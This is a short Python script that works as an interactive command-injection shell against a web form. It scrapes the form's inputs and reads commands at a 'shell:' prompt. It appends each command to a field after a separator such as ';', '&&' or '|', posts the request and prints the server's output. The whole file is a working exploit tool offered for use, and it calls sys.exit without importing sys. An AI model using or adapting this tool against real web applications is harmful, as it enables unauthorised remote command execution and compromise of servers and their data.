import requests
from bs4 import BeautifulSoup

class Command_Execute(object):

  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def execute(self):

    self.post_code = ';'
    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    post = soup.form['method'].lower()
    data = {}

    if post == 'post':
      tag = soup.form("input")

      for t in tag:
        if t['name'].lower() != 'submit':
          ip = t['name']
          data[ip] = ''
        else:
          data[t['name']] = t['value']

      while True:
        code = input("\033[1;32mshell:\033[0m")
        data[ip] = self.post_code+code
        rep = requests.post(self.url,cookies=self.cookies,data=data)
        soup = BeautifulSoup(rep.text,"html5lib")
        print(soup.pre.text,end='')

        if code == 'q':
          sys.exit('quit...')

        if soup.pre.text == '':

          for i,x in enumerate(['try to change the post code']):
            print("\033[1;31m",i,"\033[0m",x)
          choice = input("\033[1;32mnot work?:\033[0m")

          if choice == '0':
            print("input you post code,such as")
            post_code = ["&",";",'|','||','&&']
            for x in post_code:
              print("\033[1;32m"+x+"\033[0m")
            self.post_code  = input(":")
            print("post code has been change")
            print("You post code \033[1;32m%s\033[0m " % self.post_code)

          if choice == 'q':
            sys.exit('quit...')

